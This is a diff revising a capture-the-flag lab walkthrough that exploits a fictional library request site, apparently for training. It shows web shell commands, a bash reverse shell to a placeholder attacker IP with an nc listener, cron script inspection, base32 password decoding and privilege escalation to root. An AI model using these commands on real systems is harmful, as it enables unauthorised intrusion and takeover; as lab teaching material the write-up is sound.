@@ -57,26 +57,48 @@ Expect to see:
 - `22/tcp` — OpenSSH
 - `80/tcp` — Apache httpd, PHP
 
-Enumerate the web root:
+Enumerate the web root with gobuster first, for practice and to rule
+out anything else exposed:
 
 ```bash
 gobuster dir -u http://<target-ip>/ -w /usr/share/wordlists/dirb/common.txt -x php
 ```
 
-You should find:
-- `/index.php`
-- `/ill_request.php`
-- `/ill_uploads/` (empty for now — this is where uploads will land)
+This will only turn up `/index.php` (plus the usual 403'd
+`.htaccess`/`.htpasswd`/`server-status`). `common.txt` is a list of
+generic, widely-reused filenames — it won't contain a
+project-specific compound name like `ill_request.php`, so don't
+expect it to surface here. That's expected, not a sign anything is
+broken.
 
-Browse to `/ill_request.php` in a browser or with `curl` to see the
-form:
+The actual path to the request form is linked right from the
+homepage, so check the page source instead of reaching for a bigger
+wordlist:
+
+```bash
+curl -s http://<target-ip>/ | grep -i href
+```
+
+Output:
+
+```
+<p><a href="ill_request.php">Submit an ILL request</a></p>
+```
+
+That's the discovery — `ill_request.php` was sitting in an `<a href>`
+tag in the homepage's HTML the whole time, not hidden in any
+directory-brute-force-findable sense. Browse to it in a browser or
+with `curl` to see the form:
 
 ```bash
 curl http://<target-ip>/ill_request.php
 ```
 
 Note the upload form field name (`card_scan`) — you'll need it in
-Part 3.
+Part 3. The `/ill_uploads/` directory (where your upload will land)
+isn't linked anywhere and won't show up in gobuster either — you'll
+just know it's there once your file lands and you request it
+directly in Part 3.
 
 ---
 
@@ -135,8 +157,23 @@ curl "http://<target-ip>/ill_uploads/shell.php?cmd=id"
 You should see `uid=33(www-data) gid=33(www-data) ...` come back — you
 have remote code execution as `www-data`.
 
-Grab the easy flag (it lives just outside the web root, but is
-readable by `www-data`):
+Now find the easy flag rather than being handed its path — with code
+execution as `www-data`, a targeted filesystem search is the natural
+next move:
+
+```bash
+curl "http://<target-ip>/ill_uploads/shell.php?cmd=find+/+-iname+%22EASY_FLAG*%22+2>/dev/null"
+```
+
+- `find / -iname "EASY_FLAG*"` — search the whole filesystem,
+  case-insensitively, for anything named like a flag file.
+- `2>/dev/null` — discard "Permission denied" noise from directories
+  `www-data` can't read.
+- `%22` — URL-encoded double-quote, needed since the command is going
+  in as part of a URL query string.
+
+This turns up `/var/backups/library/EASY_FLAG.txt` — a path outside
+the web root, but still readable by `www-data`. Read it:
 
 ```bash
 curl "http://<target-ip>/ill_uploads/shell.php?cmd=cat+/var/backups/library/EASY_FLAG.txt"
@@ -152,16 +189,34 @@ attacker box:
 # on your attacker box:
 nc -lvnp 4444
 
-# trigger via the web shell (URL-encode as needed):
-curl -G "http://<target-ip>/ill_uploads/shell.php" \
-  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"
+# trigger via the web shell (single line — a trailing backslash + space
+# breaks line continuation, so keep this as one line rather than
+# splitting it):
+curl -G "http://<target-ip>/ill_uploads/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"
 ```
 
 ---
 
 ## Part 4 – Lateral Movement / Intermediate Challenge
 
-As `www-data`, look at what's scheduled to run as root:
+You now have an interactive shell on the box (from the reverse shell
+at the end of Part 3), so from here on these are plain commands run
+directly on the target — no more wrapping everything in `curl`.
+
+As `www-data`, you don't have an obvious lead yet — there was no
+credential or note handed to you in Part 3. Start by looking at what's
+scheduled to run on this box, since cron jobs are a common place for
+maintenance scripts (and their mistakes) to live:
+
+```bash
+ls -la /etc/cron.d/
+```
+
+```
+-rw-r--r-- 1 root root  38 Sep  2 15:02 library-sync
+```
+
+One custom cron file — `library-sync`. Read it:
 
 ```bash
 cat /etc/cron.d/library-sync
@@ -171,8 +226,9 @@ cat /etc/cron.d/library-sync
 * * * * * root /bin/bash /opt/library/ill_sync.sh
 ```
 
-The cron file itself is world-readable, and so is the script it
-points to. Read it:
+It runs `/opt/library/ill_sync.sh` as root every minute. Both the
+cron definition and the script it points to are world-readable, so
+read the script next:
 
 ```bash
 cat /opt/library/ill_sync.sh
@@ -195,15 +251,27 @@ Base32 is an encoding, not encryption — decode it:
 echo "OJSWCZDJNZTQ====" | base32 -d
 ```
 
-This recovers the plaintext password for `libclerk`. Switch to that
-user from your `www-data` shell:
+This recovers the plaintext password for `libclerk`. Your reverse
+shell is a real TTY-ish bash session, so `su` will work here (unlike
+the raw `system()` web shell from Part 3):
 
 ```bash
 su libclerk
 # password: (the decoded value)
 ```
 
-Grab the intermediate flag:
+Now find the intermediate flag rather than being handed its path —
+list `libclerk`'s home directory to confirm what's actually there:
+
+```bash
+ls -la ~
+```
+
+```
+-rw------- 1 libclerk libclerk   43 Sep  2 15:02 INTERMEDIATE_FLAG.txt
+```
+
+Read it:
 
 ```bash
 cat ~/INTERMEDIATE_FLAG.txt
@@ -278,7 +346,24 @@ Once the shell connects, confirm you're root:
 id
 ```
 
-You should see `uid=0(root)`.
+You should see `uid=0(root)`. List `/root` to see what's there before
+reading anything:
+
+```bash
+ls -la /root
+```
+
+```
+-rw------- 1 root root   56 Sep  2 15:02 HARD_FLAG.txt
+```
+
+Read it:
+
+```bash
+cat /root/HARD_FLAG.txt
+```
+
+**🚩 HARD_FLAG captured.**
 
 ---
 
